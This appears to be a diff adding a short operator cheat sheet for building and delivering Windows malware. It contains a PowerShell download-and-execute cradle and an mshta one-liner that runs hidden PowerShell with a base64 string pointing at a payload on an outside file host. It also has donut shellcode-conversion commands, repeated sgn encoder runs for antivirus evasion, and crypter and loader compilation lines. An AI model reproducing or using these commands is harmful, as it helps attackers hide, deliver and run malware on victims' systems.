@@ -1,0 +1,34 @@
+IEX (iwr 'REPLACE_LINK')
+
+base64
+
+mshta vbscript:close(createobject("wscript.shell").run("powershell -enc aHR0cHM6Ly9lYXN5ZmlsZXMuY2MvMjAyNS84LzA3ZjlkZGYwLTYwNTEtNDA2Ny1iMzYyLTZhN2RmOTMwYThhZi9tYXhfcGF5bG9hZC5iaW4=",0))
+
+donut.exe -i Client-built.exe -x2 -a2 -o loader.bin -z3 -b3
+donut.exe -i Client-built.exe -a2 -b3 -x2 -n winhttp.dll -o loader.bin -z3
+
+
+sgn32.exe -i payload.bin -o minimal_payload.bin -a 64 --plain -S
+sgn32.exe -i payload.bin -o normal_payload.bin -a 64
+sgn32.exe -i payload.bin -o max_payload.bin -a 64 -c 3 -M 1000
+
+sgn32.exe -i payload.bin -o minimal_payload.bin -a 64 --plain -S --badchars "\x00"
+sgn32.exe -i payload.bin -o normal_payload.bin -a 64 -c 1 -M 50
+sgn32.exe -i payload.bin -o high_payload.bin -a 64 -c 2 -M 200
+sgn32.exe -i payload.bin -o max_payload.bin -a 64 -c 5 -M 2000 --badchars "\x00\xff" --ascii
+
+ld -r -b binary -o payload.o shellcode.encrypted.bin
+g++ -std=c++17 -masm=intel -w clowns_encrypted.cpp payload.o -Os -static -mwindows -s -Wl,--gc-sections -o loader_encrypted.exe
+
+x86_64-w64-mingw32-g++ -s -w -masm=intel generated_loader.cpp -o loader.exe -fpermissive -lntdll -lsetupapi -lcfgmgr32 -liphlpapi -lshlwapi -lws2_32
+CrypterBuilder.exe shellcode.bin template.cpp
+
+x86_64-w64-mingw32-g++ -s -w -masm=intel generated_loader.cpp -o loader.exe -fpermissive -lntdll -Wno-narrowing
+
+hells kitchen
+
+
+donut.exe -i payload.exe -a2 -b3 -x2 -n winhttp.dll -o loader.bin -z3
+
+sgn32.exe -i payload.bin -o max_payload.bin -a 64 -c 5 -M 2000
+Get-ComputerInfo | Select-Object OsName, OsVersion, OsBuildNumber
